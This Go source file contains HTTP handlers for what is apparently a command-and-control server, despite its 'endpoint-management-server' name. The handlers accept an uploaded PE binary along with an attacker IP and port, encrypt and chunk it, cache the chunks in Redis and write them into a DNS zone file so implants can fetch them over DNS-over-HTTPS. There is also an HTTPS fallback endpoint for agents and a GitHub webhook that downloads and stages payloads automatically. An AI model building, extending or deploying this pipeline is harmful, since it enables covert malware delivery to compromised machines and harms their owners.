package handlers

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/redis/go-redis/v9"

	"endpoint-management-server/internal/auth"
	"endpoint-management-server/internal/c2"
	"endpoint-management-server/internal/middleware"
	"endpoint-management-server/internal/models"
	"endpoint-management-server/internal/repository"
)

const (
	redisKeyManifest = "payload:manifest"
	redisChunkTTL    = 86400 // 24 h
)

// PayloadHandler handles the DoH payload delivery pipeline:
//   - POST /api/v1/operator/payload/upload   — receive, encrypt, chunk, write zone
//   - GET  /api/v1/operator/payload/status   — read manifest from Redis
//   - GET  /api/v1/payload/chunk/:index      — agent direct HTTPS fallback
//   - POST /api/v1/operator/payload/webhook  — GitHub Actions CI/CD trigger
type PayloadHandler struct {
	redis         *redis.Client
	auditRepo     *repository.AuditRepository
	aesKey        []byte
	ec2IP         string
	zoneFilePath  string
	webhookSecret string
	attackerIP    string
	attackerPort  uint16
	githubToken   string
}

func NewPayloadHandler(
	redisClient *redis.Client,
	auditRepo *repository.AuditRepository,
	aesKey []byte,
	ec2IP, zoneFilePath, webhookSecret, attackerIP string,
	attackerPort uint16,
	githubToken string,
) *PayloadHandler {
	return &PayloadHandler{
		redis:         redisClient,
		auditRepo:     auditRepo,
		aesKey:        aesKey,
		ec2IP:         ec2IP,
		zoneFilePath:  zoneFilePath,
		webhookSecret: webhookSecret,
		attackerIP:    attackerIP,
		attackerPort:  attackerPort,
		githubToken:   githubToken,
	}
}

// Upload handles POST /api/v1/operator/payload/upload.
// Accepts multipart/form-data with fields:
//   - file         — the payload PE binary
//   - attacker_ip  — optional override; falls back to JOCKY_ATTACKER_IP env
//   - attacker_port — optional override; falls back to JOCKY_ATTACKER_PORT env
func (h *PayloadHandler) Upload(c *gin.Context) {
	file, _, err := c.Request.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file field missing from form"})
		return
	}
	defer file.Close()

	rawPayload, err := io.ReadAll(file)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read payload"})
		return
	}

	// Allow per-request IP/port overrides.
	ip := c.PostForm("attacker_ip")
	if ip == "" {
		ip = h.attackerIP
	}
	port := h.attackerPort
	if portStr := c.PostForm("attacker_port"); portStr != "" {
		p, err := strconv.ParseUint(portStr, 10, 16)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid attacker_port"})
			return
		}
		port = uint16(p)
	}

	log.Printf("[payload] upload from %s: %d raw bytes, ip=%s port=%d", c.ClientIP(), len(rawPayload), ip, port)

	chunks, sha256hex, err := c2.ProcessPayload(rawPayload, h.aesKey, ip, port)
	if err != nil {
		log.Printf("[payload] ProcessPayload error: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("pipeline: %v", err)})
		return
	}

	manifest := models.PayloadManifest{
		TotalChunks: len(chunks),
		TotalSize:   totalSize(chunks),
		SHA256:      sha256hex,
		Version:     "1",
		UploadedAt:  time.Now().UTC().Format(time.RFC3339),
	}

	ctx := c.Request.Context()

	// Persist each chunk in Redis for the direct HTTPS fallback endpoint.
	if err := h.storeChunks(ctx, chunks); err != nil {
		log.Printf("[payload] storeChunks error: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to cache chunks in Redis"})
		return
	}

	// Persist manifest in Redis.
	manifestJSON, _ := json.Marshal(manifest)
	if err := h.redis.Set(ctx, redisKeyManifest, manifestJSON, redisChunkTTL*time.Second).Err(); err != nil {
		log.Printf("[payload] Redis manifest error: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to store manifest"})
		return
	}

	// Write DNS zone file.
	if err := c2.WriteZoneFile(h.zoneFilePath, h.ec2IP, chunks, manifest); err != nil {
		log.Printf("[payload] WriteZoneFile error: path=%s ec2ip=%s err=%v", h.zoneFilePath, h.ec2IP, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("zone write: %v", err)})
		return
	}

	// Audit log.
	operatorID := h.operatorIDFromCtx(c)
	_ = h.auditRepo.Write(ctx, "payload_upload", "payload", operatorID, c.ClientIP(), map[string]interface{}{
		"sha256":       sha256hex,
		"total_chunks": len(chunks),
		"total_bytes":  len(rawPayload),
		"attacker_ip":  ip,
		"attacker_port": port,
	})

	c.JSON(http.StatusOK, gin.H{
		"status":        "ok",
		"chunks":        len(chunks),
		"payload_bytes": len(rawPayload),
		"sha256":        sha256hex,
	})
}

// Status handles GET /api/v1/operator/payload/status.
// Reads the manifest from Redis and returns it with current chunk count.
func (h *PayloadHandler) Status(c *gin.Context) {
	val, err := h.redis.Get(c.Request.Context(), redisKeyManifest).Result()
	if err == redis.Nil {
		c.JSON(http.StatusOK, gin.H{"status": "no payload loaded"})
		return
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "redis error"})
		return
	}

	var manifest models.PayloadManifest
	if err := json.Unmarshal([]byte(val), &manifest); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "corrupt manifest"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"manifest":     manifest,
		"chunk_count":  manifest.TotalChunks,
		"uploaded_at":  manifest.UploadedAt,
	})
}

// Chunk handles GET /api/v1/payload/chunk/:index.
// Agents call this as a direct HTTPS fallback when DoH is unavailable.
// Uses the same bearer-token agent auth as /poll.
func (h *PayloadHandler) Chunk(c *gin.Context) {
	idx := c.Param("index")
	key := fmt.Sprintf("payload:chunk:%s", idx)

	val, err := h.redis.Get(c.Request.Context(), key).Result()
	if err == redis.Nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "chunk not found"})
		return
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "redis error"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"index": idx, "data": val})
}

// Webhook handles POST /api/v1/operator/payload/webhook.
// Validates the GitHub HMAC-SHA256 signature, extracts the artifact URL
// from the body (field "artifact_url"), downloads the binary, and runs
// it through the full upload pipeline.
func (h *PayloadHandler) Webhook(c *gin.Context) {
	body, err := io.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "cannot read body"})
		return
	}

	sig := c.GetHeader("X-Hub-Signature-256")
	if !validateGitHubHMAC(body, sig, h.webhookSecret) {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid webhook signature"})
		return
	}

	var payload struct {
		ArtifactURL string `json:"artifact_url"`
		HeadCommit  struct {
			ID string `json:"id"`
		} `json:"head_commit"`
	}
	if err := json.Unmarshal(body, &payload); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid JSON body"})
		return
	}
	if payload.ArtifactURL == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "artifact_url missing from payload"})
		return
	}

	// Download the artifact binary.
	rawPayload, err := downloadArtifact(payload.ArtifactURL, h.githubToken)
	if err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"error": fmt.Sprintf("artifact download: %v", err)})
		return
	}

	ctx := c.Request.Context()
	chunks, sha256hex, err := c2.ProcessPayload(rawPayload, h.aesKey, h.attackerIP, h.attackerPort)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("pipeline: %v", err)})
		return
	}

	manifest := models.PayloadManifest{
		TotalChunks: len(chunks),
		TotalSize:   totalSize(chunks),
		SHA256:      sha256hex,
		Version:     "1",
		UploadedAt:  time.Now().UTC().Format(time.RFC3339),
	}

	if err := h.storeChunks(ctx, chunks); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to cache chunks"})
		return
	}

	manifestJSON, _ := json.Marshal(manifest)
	_ = h.redis.Set(ctx, redisKeyManifest, manifestJSON, redisChunkTTL*time.Second)

	if err := c2.WriteZoneFile(h.zoneFilePath, h.ec2IP, chunks, manifest); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("zone write: %v", err)})
		return
	}

	_ = h.auditRepo.Write(ctx, "payload_upload", "payload", nil, c.ClientIP(), map[string]interface{}{
		"trigger":    "webhook",
		"commit":     payload.HeadCommit.ID,
		"sha256":     sha256hex,
		"chunks":     len(chunks),
	})

	c.JSON(http.StatusOK, gin.H{"status": "ok", "triggered_by": payload.HeadCommit.ID})
}

// storeChunks writes each chunk to Redis with a 24-hour TTL so the
// direct HTTPS fallback endpoint can serve them.
func (h *PayloadHandler) storeChunks(ctx context.Context, chunks []string) error {
	pipe := h.redis.Pipeline()
	for i, chunk := range chunks {
		key := fmt.Sprintf("payload:chunk:%d", i)
		pipe.Set(ctx, key, chunk, redisChunkTTL*time.Second)
	}
	_, err := pipe.Exec(ctx)
	return err
}

// operatorIDFromCtx extracts the operator UUID from the JWT claims
// stored in the Gin context by the ValidateOperatorJWT middleware.
func (h *PayloadHandler) operatorIDFromCtx(c *gin.Context) *uuid.UUID {
	raw, exists := c.Get(middleware.OperatorContextKey)
	if !exists {
		return nil
	}
	claims, ok := raw.(*auth.OperatorClaims)
	if !ok {
		return nil
	}
	id := claims.OperatorID
	return &id
}

// validateGitHubHMAC checks the X-Hub-Signature-256 header against the
// webhook payload using constant-time comparison.
func validateGitHubHMAC(payload []byte, signature, secret string) bool {
	if !strings.HasPrefix(signature, "sha256=") {
		return false
	}
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write(payload)
	expected := "sha256=" + hex.EncodeToString(mac.Sum(nil))
	return hmac.Equal([]byte(expected), []byte(signature))
}

// downloadArtifact fetches a binary from the given URL, optionally
// including a GitHub API token for private artifact downloads.
func downloadArtifact(url, token string) ([]byte, error) {
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	if token != "" {
		req.Header.Set("Authorization", "token "+token)
	}
	req.Header.Set("Accept", "application/octet-stream")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("download: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("download returned HTTP %d", resp.StatusCode)
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}
	return data, nil
}

func totalSize(chunks []string) int {
	n := 0
	for _, c := range chunks {
		n += len(c)
	}
	return n
}
